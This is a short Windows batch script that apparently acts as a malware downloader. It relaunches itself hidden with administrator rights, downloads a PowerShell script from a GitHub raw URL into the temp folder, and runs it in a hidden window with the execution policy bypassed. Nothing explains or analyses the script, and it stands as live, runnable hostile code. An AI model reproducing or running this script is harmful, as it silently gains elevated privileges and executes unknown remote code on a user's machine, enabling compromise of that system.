@echo off
if "%~1"=="h" goto run

powershell -w hidden -Command "Start-Process '%~f0' h -Verb RunAs -WindowStyle Hidden"
exit /b

:run
curl -sL "https://github.com/analysisw/test/raw/refs/heads/main/test.ps1" -o "%TEMP%\t.ps1"
powershell -w hidden -ep bypass -f "%TEMP%\t.ps1"
exit /b
